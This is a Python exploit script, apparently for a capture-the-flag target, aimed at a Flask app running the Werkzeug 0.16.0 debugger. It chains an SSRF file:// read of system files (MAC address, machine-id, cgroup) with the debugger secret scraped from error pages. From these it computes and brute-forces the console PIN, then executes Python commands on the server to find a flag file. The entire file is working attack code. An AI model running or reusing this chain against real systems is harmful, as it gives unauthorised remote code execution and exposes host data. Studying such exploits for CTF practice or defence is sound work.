"""Werkzeug 0.16.0 PIN exploit - older algorithm."""
import requests
import hashlib
import re

T = "http://10.82.168.213"


def read_ssrf(path):
    r = requests.get(f"{T}/download?server=file://{path}?&id=1", timeout=8)
    if r.status_code == 200 and "Werkzeug" not in r.text:
        return r.content
    return None


# Step 1: Get the debugger secret from an error page
print("[1] Getting error page with debugger secret...")
r = requests.get(f"{T}/download?server=INVALID_GARBAGE&id=1", timeout=10)
# The secret is in links like: ?__debugger__=yes&cmd=resource&f=style.css&s=SECRET
secrets = re.findall(r'[&?]s=([a-zA-Z0-9]+)', r.text)
if secrets:
    secret = secrets[0]
    print(f"    Secret: {secret}")
else:
    print("    No secret found. Checking error page patterns...")
    # Try a different error trigger
    r = requests.get(f"{T}/download?server=http://127.0.0.1:1/x?y=&id=1", timeout=10)
    secrets = re.findall(r'[&?]s=([a-zA-Z0-9]+)', r.text)
    if secrets:
        secret = secrets[0]
        print(f"    Secret: {secret}")
    else:
        print(f"    Error page snippet: {r.text[:500]}")
        secret = None

if not secret:
    print("FAILED to get secret")
    exit(1)

# Step 2: Gather info for PIN calculation
# Werkzeug 0.16.0 PIN generation
print("\n[2] Gathering PIN info...")
username = "root"
modname = "flask.app"
appname = "Flask"
mod_path = "/usr/local/lib/python3.10/site-packages/flask/app.py"

# MAC address as uuid.getnode() returns
mac_data = read_ssrf("/sys/class/net/eth0/address")
mac_str = mac_data.decode().strip()
mac_int = int(mac_str.replace(":", ""), 16)
print(f"    MAC: {mac_str} -> {mac_int}")

# Machine ID - for Werkzeug 0.16.0, get_machine_id() reads:
# /etc/machine-id, then /proc/sys/kernel/random/boot_id, then /proc/self/cgroup
machine_id = None
for path in ["/etc/machine-id", "/proc/sys/kernel/random/boot_id"]:
    data = read_ssrf(path)
    if data:
        machine_id = data.decode().strip()
        print(f"    machine_id from {path}: {machine_id}")
        break

# Also get cgroup for Docker
cgroup = read_ssrf("/proc/self/cgroup")
docker_id = ""
if cgroup:
    for line in cgroup.decode().splitlines():
        parts = line.strip().split("/")
        if "docker" in line and len(parts) > 2:
            docker_id = parts[-1]
            break
    print(f"    docker_id: {docker_id}")

# Step 3: Calculate PIN - Werkzeug 0.16.0 algorithm
print("\n[3] Calculating PINs...")

# In Werkzeug 0.16.0, the PIN is generated in werkzeug/debug/__init__.py
# The hash is MD5 of: pin|username|modname|appname|str(uuid.getnode())|machine_id
# pin_base = md5("|".join(bits)).hexdigest()[:9]

# Try different combinations of machine_id
machine_id_variants = []
if machine_id:
    machine_id_variants.append(machine_id)
if docker_id:
    machine_id_variants.append(docker_id)
    if machine_id:
        machine_id_variants.append(machine_id + docker_id)

pins = set()
for mid in machine_id_variants:
    # Werkzeug 0.16.0 method
    h = hashlib.md5()
    for bit in [username, modname, appname, str(mac_int), mid]:
        if isinstance(bit, str):
            bit = bit.encode("utf-8")
        h.update(bit)
    num = f"{int(h.hexdigest(), 16):09d}"[:9]
    pin = f"{num[:3]}-{num[3:6]}-{num[6:]}"
    pins.add(pin)
    print(f"    PIN (md5, mid={mid[:20]}...): {pin}")

    # Also try with | separator (some versions use pipes)
    h2 = hashlib.md5()
    bits = f"{username}|{modname}|{appname}|{mac_int}|{mid}"
    h2.update(bits.encode("utf-8"))
    num2 = f"{int(h2.hexdigest(), 16):09d}"[:9]
    pin2 = f"{num2[:3]}-{num2[3:6]}-{num2[6:]}"
    pins.add(pin2)
    print(f"    PIN (md5 pipe, mid={mid[:20]}...): {pin2}")

# Step 4: Try each PIN
print(f"\n[4] Testing {len(pins)} PINs against debugger...")
for pin in pins:
    auth_url = f"{T}?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}"
    r = requests.get(auth_url, timeout=8)
    result = r.json() if r.headers.get("content-type", "").startswith("application/json") else r.text
    print(f"    PIN {pin}: {result}")
    
    if "true" in str(result).lower() or "auth" in str(result).lower():
        print(f"\n    >>> PIN ACCEPTED: {pin} <<<")
        
        # Now execute commands to find flag.txt
        cmds = [
            "import os; print(os.listdir('/usr/src/app'))",
            "import os; print([f for r,d,files in os.walk('/usr/src') for f in files if '.txt' in f])",
            "import os; print([os.path.join(r,f) for r,d,files in os.walk('/usr/src') for f in files if '.txt' in f])",
        ]
        
        for cmd in cmds:
            exec_url = f"{T}?__debugger__=yes&cmd={requests.utils.quote(cmd)}&frm=0&s={secret}"
            r2 = requests.get(exec_url, timeout=8)
            print(f"\n    >>> {cmd}")
            # Parse the response
            text = re.sub(r'<[^>]+>', '', r2.text)
            for line in text.splitlines():
                line = line.strip()
                if line and ">>>" not in line:
                    print(f"    {line}")
        break
